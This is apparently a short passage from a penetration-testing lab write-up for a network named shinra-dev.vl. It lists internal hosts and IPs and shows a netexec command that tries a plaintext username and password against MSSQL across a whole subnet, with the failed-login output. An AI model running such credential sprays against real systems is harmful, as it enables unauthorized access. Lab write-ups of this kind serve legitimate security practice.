172.16.11.10	client01.shinra-dev.vl
172.16.11.11	
172.16.11.13	client04.shinra-dev.vl
172.16.11.25
172.16.11.50	file01.shinra-dev.vl
172.16.11.70
172.16.11.71	registry.shinra-dev.vl
172.16.11.101	dc.shinra-dev.vl	shinra-dev.vl


```

I will post all the scans on these machines on the appropriate pages. EDIT: Apparently I missed the SQL server?

```bash
└─$ netexec mssql 172.16.11.0/24 -u william.davis -p Eniwy7j5KH+oze 
MSSQL       172.16.11.80    1433   SQL01            [*] Windows 10 / Server 2019 Build 17763 (name:SQL01) (domain:shinra.vl)
MSSQL       172.16.11.80    1433   SQL01            [-] shinra.vl\william.davis:Eniwy7j5KH+oze (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```